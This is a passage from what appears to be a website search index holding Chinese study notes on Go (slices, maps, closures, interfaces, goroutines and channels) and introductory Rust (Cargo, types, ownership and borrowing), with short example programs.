<p>\u53ef\u4ee5\u4f7f\u7528make\u521b\u5efa\u52a8\u6001\u6570\u7ec4</p> <pre><code>b := make([]int, 0, 5) // len(b)=0, cap(b)=5\n\nb = b[:cap(b)] // len(b)=5, cap(b)=5\nb = b[1:]      // len(b)=4, cap(b)=4\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528range\u904d\u5386\u6570\u7ec4</p> <pre><code>var pow = []int{1, 2, 4, 8, 16, 32, 64, 128}\n\nfunc main() {\n    for i, v := range pow {\n        fmt.Printf(\"2**%d = %d\\n\", i, v)\n    }\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#54-map","title":"5.4 map","text":"<pre><code>func main() {\n    var m = make(map[string]Vertex)\n    m[\"Bell Labs\"] = Vertex{\n        40.68433, -74.39967,\n    }\n    fmt.Println(m[\"Bell Labs\"])\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#55","title":"5.5 \u51fd\u6570\u95ed\u5305","text":"<pre><code>func fibonacci() func() int {\n    a, b := 0, 1\n    return func() int {\n        a, b = b, a+b\n        return a\n    }\n}\nfunc main() {\n    f := fibonacci()\n    for i := 0; i &lt; 10; i++ {\n        fmt.Println(f())\n    }\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#56","title":"5.6 \u63a5\u53e3","text":"<pre><code>type Abser interface {\n    Abs() float64\n}\n\nfunc main() {\n    var a Abser\n    f := MyFloat(-math.Sqrt2)\n    v := Vertex{3, 4}\n\n    a = f  // a MyFloat \u5b9e\u73b0\u4e86 Abser\n    a = &amp;v // a *Vertex \u5b9e\u73b0\u4e86 Abser\n}\n\nfunc (v *Vertex) Abs() float64 {\n    return math.Sqrt(v.X*v.X + v.Y*v.Y)\n}\n</code></pre> <p>\u63a5\u53e3\u8868\u793a\u4e86\u4e00\u4e2a\u7c7b\u578b\u9700\u8981\u5b9e\u73b0\u7684\u65b9\u6cd5\uff0c\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7c7b\u578b\u7684\u6307\u9488\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u90a3\u4e48\u63a5\u53e3\u4e5f\u53ea\u80fd\u63a5\u53d7\u8be5\u7c7b\u578b\u7684\u6307\u9488\u3002</p> <p>\u63a5\u53e3\u4f5c\u4e3a\u7c7b\u578b\u7cfb\u7edf\u4e2d\u7684\u4e00\u79cd\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\u4ee5\u53ca\u51fd\u6570\u8fd4\u56de\u503c\uff0c\u8fdb\u884c\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002</p> <p>\u5373\u4fbf\u8d4b\u503c\u7ed9\u63a5\u53e3\u7684\u6307\u9488\u662f\u7a7a\u6307\u9488\uff0c\u53ea\u9700\u8981\u5176\u5bf9\u5e94\u7684\u7c7b\u578b\u5b9e\u73b0\u4e86\u76f8\u5e94\u7684\u65b9\u6cd5\uff0c\u4f9d\u65e7\u662f\u53ef\u4ee5\u4f20\u5165\u7684</p> <p>\u603b\u5f97\u6765\u8bf4\uff0c\u63a5\u53e3\u5c31\u662f\u5c06\u5177\u4f53\u7684\u7ed3\u6784\u4f53\u5316\u4e3a\u80fd\u8c03\u7528\u7279\u5b9a\u65b9\u6cd5\u7684\u62bd\u8c61\u5b58\u5728</p> <p>\u7c7b\u578b\u65ad\u8a00</p> <pre><code>// i\u662f\u4e00\u4e2a\u63a5\u53e3, T\u662f\u4e00\u4e2a\u7c7b\u578b\nt := i.(T)\nt, ok := i.(T)\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u4ece\u63a5\u53e3\u4e2d\u63d0\u53d6\u7279\u5b9a\u7684\u7c7b\u578b\uff0c\u8fd9\u4e24\u4e2a\u8bed\u53e5\u5176\u5b9e\u90fd\u5728\u505a\u76f8\u540c\u7684\u4e8b\uff0c\u533a\u522b\u5728\u4e8e\uff0c\u7b2c\u4e00\u4e2a\u8bed\u53e5\u82e5\u63d0\u53d6\u5931\u8d25\u4f1a\u76f4\u63a5panic\uff0c\u800c\u7b2c\u4e8c\u4e2a\u8bed\u53e5\u4f1a\u628a\u63d0\u53d6\u662f\u5426\u6210\u529f\u7684bool\u5b58\u50a8\u5728ok\u4e2d</p> <p>\u7531\u6b64\u6269\u5c55\u4e86\u7c7b\u578b\u9009\u62e9\u7684\u8bed\u6cd5\uff0c\u4f7f\u7528type\u66ff\u4ee3\u5177\u4f53\u7684\u7c7b\u578b</p> <pre><code>func do(i interface{}) {\n    switch v := i.(type) {\n    case int:\n        fmt.Printf(\"\u4e8c\u500d\u7684 %v \u662f %v\\n\", v, v*2)\n    case string:\n        fmt.Printf(\"%q \u957f\u5ea6\u4e3a %v \u5b57\u8282\\n\", v, len(v))\n    default:\n        fmt.Printf(\"\u6211\u4e0d\u77e5\u9053\u7c7b\u578b %T!\\n\", v)\n    }\n}\n</code></pre> <p>\u5e38\u89c1\u7684\u63a5\u53e3\u6bd4\u5982fmt\u4e2d\u7684</p> <pre><code>type Stringer interface {\n    String() string\n}\n</code></pre> <p>\u80fd\u88ab\u8be5\u63a5\u53e3\u63a5\u53d7\u7684\u7c7b\u578b\uff0c\u90fd\u80fd\u591f\u7528string\u6765\u63cf\u8ff0\u81ea\u8eab</p> <p>\u9519\u8bef\u63a5\u53e3</p> <pre><code>type ErrNegativeSqrt float64\n\nfunc (e ErrNegativeSqrt) Error() string {\n    return fmt.Sprintf(\"cannot Sqrt negative number: %v\", float64(e))\n}\n\nfunc Sqrt(x float64) (float64, error) {\n    if x &lt; 0 {\n        return 0, ErrNegativeSqrt(x)\n    }\n    z := 1.0\n    for i := 0; i &lt; 10; i++ {\n        z -= (z*z - x) / (2 * z)\n    }\n    return z, nil\n}\n\nfunc main() {\n    fmt.Println(Sqrt(2))\n    fmt.Println(Sqrt(-2))\n}\n</code></pre> <p>Go\u4e2d\u7684\u9519\u8bef\u63a5\u53e3\u5982\u4e0b\uff0c\u5f53\u6211\u4eec\u9700\u8981\u8fd4\u56de\u9519\u8bef\u503c\u7684\u65f6\u5019\uff0c\u9700\u8981\u5b9a\u5236\u4e00\u4e2a\u9519\u8bef\u7c7b\u578b\uff0c\u5e76\u4e14\u8bbe\u5b9a\u591a\u8fd4\u56de\u503c\uff0c\u5f53error\u7684\u503c\u4e3anil\u7684\u65f6\u5019\uff0c\u5219\u8bf4\u660e\u672a\u51fa\u9519</p> <pre><code>type error interface {\n    Error() string\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Go%20%E5%85%A5%E9%97%A8/Go%20%E5%85%A5%E9%97%A8/#6","title":"6. \u5e76\u53d1","text":"<p>Go\u8bed\u8a00\u7684\u534f\u7a0b\u662f\u4e00\u5927\u8bed\u8a00\u7279\u8272\uff0c\u542f\u52a8\u4e00\u4e2a\u534f\u7a0b\u7684\u4ee3\u7801\u5982\u4e0b</p> <pre><code>go f(x,y,z)\n</code></pre> <p>\u7ebf\u7a0b\u4e4b\u95f4\u901a\u4fe1\uff0c\u53ef\u4ee5\u901a\u8fc7chan\u7c7b\u578b\u5b9e\u73b0\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u4f20\u9012int\u53d8\u91cf\u7684\u901a\u9053</p> <pre><code>c := make(chan int)\n</code></pre> <p>\u5728\u8fd9\u4e00\u6bb5\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u5b9e\u73b0\u4e86\u7ebf\u7a0b\u548c\u4e3b\u7ebf\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u6211\u4eec\u4f7f\u7528<code>&lt;-</code>\u200b\u8fd9\u4e2a\u6807\u8bb0\u6765\u4f20\u9012\u6570\u636e</p> <pre><code>func sum(s []int, c chan int) {\n    sum := 0\n    for _, v := range s {\n        sum += v\n    }\n    c &lt;- sum // \u53d1\u9001 sum \u5230 c\n}\n\nfunc main() {\n    s := []int{7, 2, 8, -9, 4, 0}\n\n    c := make(chan int)\n    go sum(s[:len(s)/2], c)\n    go sum(s[len(s)/2:], c)\n    x, y := &lt;-c, &lt;-c // \u4ece c \u63a5\u6536\n\n    fmt.Println(x, y, x+y)\n}\n</code></pre> <p>\u5728\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\uff0c\u53d1\u9001\u548c\u63a5\u53d7\u7aef\u5728\u53e6\u4e00\u7aef\u51c6\u5907\u597d\u4e4b\u524d\uff0c\u4e5f\u5c31\u662f\u8fd0\u884c\u5230<code>&lt;-</code>\u200b\u7684\u4ee3\u7801\u4e4b\u524d\uff0c\u5c31\u4f1a\u963b\u585e\uff0c\u4ee5\u6b64\u5b9e\u73b0\u7ebf\u7a0b\u4e4b\u95f4\u7684\u540c\u6b65</p> <p>\u5f53\u6211\u4eec\u521b\u5efa\u4fe1\u9053\u7684\u65f6\u5019\uff0c\u8fd8\u53ef\u4ee5\u8bbe\u5b9a\u5176\u7f13\u51b2\u533a\uff0c\u5f53\u5176\u7f13\u51b2\u533a\u6ee1\u4e4b\u540e\u5c31\u9677\u5165\u963b\u585e\uff0c\u7f13\u51b2\u533a\u5c31\u662f\u6307\u8be5\u4fe1\u9053\u53ef\u4ee5\u4f20\u9012\u7684\u6570\u636e\u7684\u4e2a\u6570\uff0c\u6bd4\u5982\u4e0b\u9762\u8fd9\u4e2a\u4fe1\u9053\u53ea\u80fd\u4f20\u901210\u4e2aint\uff0c\u968f\u540e\u5c31\u4f1a\u963b\u585e</p> <pre><code>c := make(chan int, 10)\ncap(c) // 10\n</code></pre> <p>range \u548c close</p> <p>\u6211\u4eec\u53ef\u4ee5\u7528close\u624b\u52a8\u5173\u95ed\u4e00\u4e2a\u4fe1\u9053\uff0c\u540c\u65f6\u5728\u53e6\u4e00\u7aef\u53ef\u4ee5\u901a\u8fc7range\u68c0\u6d4b\u4fe1\u9053\u7684\u5173\u95ed</p> <pre><code>func fibo(n int, c chan int){\n    x, y := 0,1\n    for i:=0; i&lt;n; i++{\n        c &lt;- x\n        x,y = y,x+y\n    }\n    close(c)\n}\n\n\nfunc main() {\n    c := make(chan int, 10)\n    go fibo(cap(c), c)\n    for i := range c{\n        fmt.Println(i)\n    }\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/","title":"Rust \u5165\u95e8","text":"<p>rust</p> <p>\u57fa\u7840\u90e8\u5206\u4e3b\u8981\u53c2\u7167\u4e86Rust Course\uff0c\u5199\u7684\u5df2\u7ecf\u6bd4\u8f83\u8be6\u7ec6\u4e86\uff0c\u56e0\u6b64\u6211\u7684\u7b14\u8bb0\u4ec5\u4ec5\u8bb0\u5f55\u4e86\u4e00\u4e9b\u91cd\u70b9\u3002\u7ec3\u4e60\u90e8\u5206\u53c2\u7167\u4e86Rust Course\u81ea\u5e26\u7684\u4e00\u4e9b\u7ec3\u4e60\u4ee5\u53caCS110L\u7684\u7ec3\u4e60\u3002\u628a\u4f7f\u7528\u5230\u7684\u6709\u7528\u7684\u94fe\u63a5\u653e\u7f6e\u4e8e\u6b64 </p> <ul> <li>Rust Course</li> <li>CS 110L</li> <li>rust-lang.org \u5b98\u65b9\u6587\u6863</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#1-cargo","title":"1. Cargo\u4e0e\u6587\u4ef6\u7ed3\u6784","text":"<p>cargo \u662frust\u7684\u5305\u7ba1\u7406\u5de5\u5177\uff0c\u5e2e\u52a9\u6211\u4eec\u6784\u5efarust\u9879\u76ee\u548c\u7f16\u8bd1\u8fd0\u884c</p> <ul> <li>\u65b0\u5efa\u4e00\u4e2arust\u9879\u76ee<code>cargo new [name]</code>\u200b</li> <li>\u7f16\u8bd1\u8fd0\u884c <code>cargo run</code>\u200b</li> <li>\u7f16\u8bd1<code>cargo build</code>\u200b</li> </ul> <p>\u751f\u6210\u7684\u6587\u4ef6\u5728<code>/target/debug</code>\u200b\u4e2d\uff0c\u5982\u4e0b\u56fe</p> <p></p> <p>\u5982\u6211\u4eec\u6240\u89c1\uff0c\u9ed8\u8ba4\u7684build\u548crun\u7ed3\u679c\u662fbebug\u7ed3\u679c\uff0c\u8fd9\u4e0eqt\u9879\u76ee\u7b49\u7c7b\u4f3c\uff0c\u7279\u70b9\u662f\u7f16\u8bd1\u5feb\u4f46\u8fd0\u884c\u6162\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>cargo build --release</code>\u200b\u6765\u6784\u5efarelease\u7248\u672c\u3002</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#2","title":"2. \u53d8\u91cf","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#21","title":"2.1 \u53d8\u91cf\u58f0\u660e\u89c4\u8303","text":"<p>Rust\u4e2d\u7684\u53d8\u91cf\u9075\u5faa\u5e38\u89c4\u7f16\u7a0b\u8bed\u8a00\u4e2d\u7684\u4e00\u7cfb\u5217\u89c4\u77e9\uff0c\u4f8b\u5982\u4e0d\u53ef\u4e0e\u5173\u952e\u8bcd\u91cd\u590d\u7b49\u7b49\uff0c\u547d\u540d\u4e5f\u9700\u8981\u9075\u5faa\u4e00\u5b9a\u7684\u89c4\u8303</p> <ul> <li> <p>\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u53d8\u91cf\u7684\u53ef\u53d8\u6027\uff0c\u5176\u9ed8\u8ba4\u662f\u4e0d\u53ef\u53d8</p> </li> <li> <p>\u200b<code>let x = 5;</code>\u200b \u4e0d\u53ef\u53d8</p> </li> <li>\u200b<code>let mut x = 5;</code>\u200b \u53ef\u53d8</li> <li>\u200b<code>const x = 5;</code>\u200b\u4e0d\u53ef\u53d8</li> </ul> <p>rust\u7684\u7f16\u8bd1\u5668\u4f1a\u7ed9\u51fawarning\u5f53\u6211\u4eec\u672a\u4f7f\u7528\u4e00\u4e2a\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u6b64\u65f6\u6211\u4eec\u5982\u679c\u786e\u5b9e\u9700\u8981\u8fd9\u4e2a\u53d8\u91cf\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u5176\u524d\u9762\u52a0\u4e00\u4e2a\u4e0b\u5212\u7ebf<code>let _x = 5;</code>\u200b</p> <p>\u53d8\u91cf\u4f5c\u7528\u57df</p> <p>Rust\u5141\u8bb8\u5728\u540c\u4e00\u4ee3\u7801\u5757\u4e2d\u4f7f\u7528\u4e24\u4e2a\u76f8\u540c\u540d\u79f0\u7684\u53d8\u91cf\uff0c\u4f46\u662f\u540e\u8005\u7684\u51fa\u73b0\u5c31\u4f1a\u906e\u853d\u524d\u8005</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#22","title":"2.2 \u53d8\u91cf\u7c7b\u578b","text":"<p>Rust\u5bf9\u4e8e\u53d8\u91cf\u7c7b\u578b\u662f\u4e25\u683c\u7684\uff0c\u4e0d\u5141\u8bb8\u4e0d\u540c\u7c7b\u578b\u7684\u76f8\u4e92\u8d4b\u503c\u3002Rust\u4e2d\u7684\u57fa\u7840\u7c7b\u578b\u5c31\u50cfJava\u91cc\u7684Integer\u4e00\u6837\u7ed1\u5b9a\u4e86\u57fa\u7840\u7684\u64cd\u4f5c\uff0c\u5e76\u4e14Rust\u7684\u5bf9\u8c61\u652f\u6301\u8fd0\u7b97\u7b26\u91cd\u8f7d</p> <p>\u53ef\u4ee5\u901a\u8fc7<code>std::mem::size_of_val(&amp;x)</code>\u200b\u67e5\u770b\u53d8\u91cf\u7684\u5185\u5b58\u5927\u5c0f</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#_1","title":"\u6574\u6570\u7c7b\u578b","text":"<p>Rust\u4e2d\u6211\u4eec\u4e00\u822c\u5e0c\u671b\u80fd\u591f\u7ed9\u51fa\u6574\u6570\u5177\u4f53\u7684\u4f4d\u6570\uff0c\u4f46\u662f\u5728\u8fd0\u884c\u6548\u7387\u548c\u4fbf\u5229\u6027\u4e0a\uff0c\u6211\u4eec\u9996\u9009 \"i32\"</p> <p>\u200b\u200b</p> <pre><code>let mut x:i32 = 100_000; //\u5bf9\u4e8e\u6570\u5b57\u5b57\u9762\u91cf\uff0c\u53ef\u4ee5\u52a0_\u6765\u63d0\u9ad8\u53ef\u8bfb\u6027\n</code></pre> <p>\u5728debug\u6a21\u5f0f\u4e0b\u4f1a\u68c0\u67e5\u6574\u6570\u6ea2\u51fa\uff0c\u800crelease\u4e0b\u4e0d\u4f1a\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u6574\u6570\u81ea\u5e26\u7684\u65b9\u6cd5\u6765\u663e\u5f0f\u5730\u68c0\u67e5\u6ea2\u51fa</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#_2","title":"\u6d6e\u70b9\u6570\u7c7b\u578b","text":"<p>\u6d6e\u70b9\u6570\u7c7b\u578b\u6bd4\u8f83\u7b80\u5355\uff0c\u6709\u4e24\u79cd 'f32' \u548c 'f64'\u3002\u800c\u6d6e\u70b9\u6570\u7684\u7279\u6b8a\u6027\u5728\u4e8e\u5176\u4e0d\u53ef\u4ee5\u505a\u7cbe\u786e\u6bd4\u8f83\uff08\u8fd9\u4e2a\u7279\u6027\u5bfc\u81f4\u5176\u4e0d\u53ef\u505aMap\u7684key\uff09</p> <p>\u5bf9\u4e8e\u6570\u5b66\u4e0a\u7684\u672a\u5b9a\u4e49\u884c\u4e3a\uff0c\u5982\u8d1f\u6570\u505asqrt\u7b49\uff0c\u4f1a\u8fd4\u56deNan\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>is_nan()</code>\u200b\u65b9\u6cd5\u6765\u8fdb\u884c\u663e\u793a\u5224\u65ad</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#_3","title":"\u5e8f\u5217","text":"<p>Rust\u4e2d\u7684\u5e8f\u5217\u5e38\u7528\u4e8e\u5faa\u73af\u4f53\u4e2d\uff0c\u4ec5\u5bf9\u4e8e\u6570\u5b57\u548c\u5b57\u7b26</p> <pre><code>for i in 1..=5{\n    println!(\"{}\",i);\n}\n</code></pre> <p>\u200b<code>1..5</code>\u200b\u548c<code>1..=5</code>\u200b\u7684\u533a\u522b\u5728\u4e8e\u540e\u8005\u5305\u62ec5\uff0c\u8868\u73b0\u7684\u884c\u4e3a\u7c7b\u4f3cPython\u4e2d\u7684range</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#_4","title":"\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32","text":"<p>Rust\u4e2d\u5355\u5f15\u53f7\u7528\u4e8e\u5b57\u7b26\uff0c\u53cc\u5f15\u53f7\u7528\u4e8e\u5b57\u7b26\u4e32\uff0c\u4e0eC\u7c7b\u4f3c</p> <p>\u5f53\u6211\u4eec\u9700\u8981\u663e\u5f0f\u7684\u7c7b\u578b\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528\u5230<code>as</code>\u200b \u5173\u952e\u8bcd</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#23","title":"2.3 \u6240\u6709\u6743\u4e0e\u5f15\u7528","text":"<p>\u6240\u6709\u6743\uff08Ownership\uff09\u662fRust\u91cc\u9762\u4e00\u4e2a\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u662f\u4e00\u4e2aagent\u62e5\u6709\u53ef\u4ee5\u8bbf\u95ee\u6216\u8005\u9500\u6bc1\u4e00\u4e2a\u8d44\u6e90\u7684\u6743\u9650\u3002\u6240\u6709\u6743\u662f\u552f\u4e00\u4e14\u72ec\u5360\u7684\uff0c\u4e00\u4e2a\u53d8\u91cf\u4ec5\u6709\u4e00\u4e2a\u6240\u6709\u8005\u3002\u8be5\u6240\u6709\u8005\u7684\u4f5c\u7528\u9886\u57df\u6d88\u5931\u65f6\uff0c\u8be5\u53d8\u91cf\u88ab\u4e22\u5f03\u3002</p> <pre><code>fn main() {\n    let temp = String::from(\"hello\");\n    let test = temp;\n   // println!(\"{}\",temp);\n    println!(\"{}\",test);\n}\n</code></pre> <p>\u5f53test\u83b7\u53d6\u4e86\u8be5\u5bf9\u8c61\u7684\u6240\u6709\u6743\u7684\u65f6\u5019\uff0c\u6b64\u65f6temp\u5df2\u7ecf\u4e0d\u518d\u62e5\u6709\u6240\u6709\u6743\uff0c\u6b64\u65f6\u5982\u679c\u53d6\u6d88\u6ce8\u91ca\uff0c\u518d\u6b21\u4f7f\u7528temp\uff0c\u5c31\u4f1a\u62a5\u9519\uff1b\u5305\u62ec\u5411\u51fd\u6570\u91cc\u9762\u4f20\u53c2\u7684\u65f6\u5019\u4e5f\u4e00\u6837</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u8f6c\u79fb\u6240\u6709\u6743\u7684\u65f6\u5019\u5176\u5b9e\u662f\u53ef\u4ee5\u6539\u53d8\u53d8\u91cf\u7684\u53ef\u53d8\u6027\u7684</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#_5","title":"\u5f15\u7528\u548c\u501f\u7528","text":"<p>\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u53ef\u53d8\u53d8\u91cf\uff0cRust\u89c4\u5b9a\u5176\u5728\u540c\u4e00\u4e2a\u4f5c\u7528\u57df\u4e2d\uff0c\u4ec5\u4ec5\u53ef\u4ee5\u62e5\u6709\u4e00\u4e2a\u53ef\u53d8\u5f15\u7528\u6216\u8005\u591a\u4e2a\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u4e0b\u9762\u4e00\u4e2a\u4f8b\u5b50\u6211\u4eec\u5206\u522b\u6784\u5efa\u4e86\u4e00\u4e2a\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u5f15\u7528</p> <p>\u7531\u4e8e\u5176\u672c\u8eab\u6240\u6709\u6743\u5c31\u5df2\u7ecf\u5b58\u5728\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u4e24\u79cd\uff0c\u53ef\u53d8\u5f15\u7528\u53ea\u80fd\u9488\u5bf9\u53ef\u53d8\u7684\u5bf9\u8c61\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u628a\u4e0d\u53ef\u53d8\u5bf9\u8c61\u7684\u6240\u6709\u6743\u4ea4\u7ed9\u53ef\u53d8\u5bf9\u8c61</p> <pre><code>fn mut_test(temp:&amp; mut String){\n    (*temp) += \"hello\";\n    println!(\"{}\", *temp);\n}\nfn non_mut_test(temp:&amp; String){\n    println!(\"{}\", *temp);\n}\nfn main() {\n    let mut test1 = String::from(\"world\");\n    mut_test(&amp;mut test1);\n    mut_test(&amp;mut test1);\n    non_mut_test(&amp;test1);\n    println!(\"{}\",test1)\n}\n</code></pre> <p>\u4e0a\u8ff0\u7a0b\u5e8f\u662f\u6b63\u786e\u7684\uff0c\u56e0\u4e3a\u5176\u6240\u6709\u7684\u53ef\u53d8\u5f15\u7528\u90fd\u81ea\u5df1\u8fd9\u884c\u51fd\u6570\u8c03\u7528\u4e2d\u8bde\u751f\u9500\u6bc1\uff0c\u56e0\u6b64\u4e0d\u5b58\u5728\u5171\u5b58\u7684\u53ef\u53d8\u5f15\u7528\u3002\u4e0b\u9762\u7a0b\u5e8f\u4fbf\u662f\u9519\u8bef\u7684</p> <pre><code>fn main() {\n    let mut test1 = String::from(\"world\");\n    let mut t1 = &amp;mut test1;\n    let mut t2 = &amp;mut test1;\n    *t1 += \"hello\";\n}\n</code></pre> <p>\u53ef\u53d8\u5f15\u7528\u8981\u663e\u5f0f\u5730\u8bf4\u660e\uff0c\u5982\u540ccpp\u4e2d\u7684\u5e38\u91cf\u6307\u9488\u8981\u663e\u5f0f\u8bf4\u660e\u4e00\u6837\uff0c\u4e0a\u8ff0\u4ee3\u7801\u6211\u4eec\u4e4b\u6240\u4ee5\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a\u53ef\u53d8\u5f15\u7528\uff0c\u662f\u56e0\u4e3a\u8fd9\u4e9b\u53ef\u53d8\u5f15\u7528\u90fd\u5728\u5404\u81ea\u51fd\u6570\u7684\u4f5c\u7528\u57df\u4e2d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#_6","title":"\u5806\u4e0a\u5143\u7d20\u548c\u57fa\u672c\u5143\u7d20\u7684\u533a\u522b","text":"<p>\u5bf9\u4e8eRust\u800c\u8a00\uff0c\u5176\u548cJava\u4e00\u6837\u533a\u5206\u5b58\u50a8\u5728\u5806\u4e0a\u548c\u6808\u4e0a\u7684\u53d8\u91cf\u7684\u533a\u522b\uff0c\u5bf9\u4e8e\u7b80\u5355\u7684\u7c7b\u578b</p> <pre><code>let x = 1;\nlet y = x;\n</code></pre> <p>\u6b64\u65f6\u505a\u7684\u662f\u62f7\u8d1d\uff0c\u800c\u524d\u6587\u4e2d\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u8d4b\u503c\uff0c\u4fbf\u662f\u79fb\u52a8\u4e86\uff0c\u79fb\u52a8\u4f1a\u5bfc\u81f4\u539f\u5148\u5143\u7d20\u4e2d\u7684\u53d8\u91cf\u5931\u6548\u3002</p> <pre><code>fn main() {\n    let temp = String::from(\"hello\");\n    let test = temp;\n   // println!(\"{}\",temp); \u62a5\u9519\n    println!(\"{}\",test);\n}\n</code></pre> <p>\u5728Rust\u4e2d\uff0c\u4efb\u4f55\u60f3\u8981\u5bf9\u4e8e\u590d\u6742\u5143\u7d20\u8fdb\u884c\u6df1\u62f7\u8d1d\u7684\u64cd\u4f5c\uff0c\u90fd\u662f\u663e\u5f0f\u7684\u3002</p> <pre><code>fn main() {\n    let temp = String::from(\"hello\");\n    let test = temp.clone();\n   // println!(\"{}\",temp); \u4e0d\u62a5\u9519\n    println!(\"{}\",test);\n}\n</code></pre> <p>\u5173\u4e8e\u51fd\u6570\u4e0e\u5b8f</p> <p>\u5728\u8fd9\u91cc\u5176\u5b9e\u6709\u70b9\u95ee\u9898\uff0c\u65e2\u7136\u4f20\u5165\u51fd\u6570\u4e5f\u662f\u5728\u5bf9\u590d\u6742\u5143\u7d20\u505a\u79fb\u52a8\uff0c\u90a3println\u548b\u529e\uff0c\u5176\u5b9e\u5728Rust\u4e2d\uff0c\u6211\u4eec\u5e38\u7528\u7684println!\u5e76\u975e\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u800c\u662f\u4e00\u4e2a\u5b8f\uff0c\u56e0\u6b64\u5176\u4e0d\u5f71\u54cd\u6240\u6709\u6743\u7684\u95ee\u9898</p> <p>Copy</p> 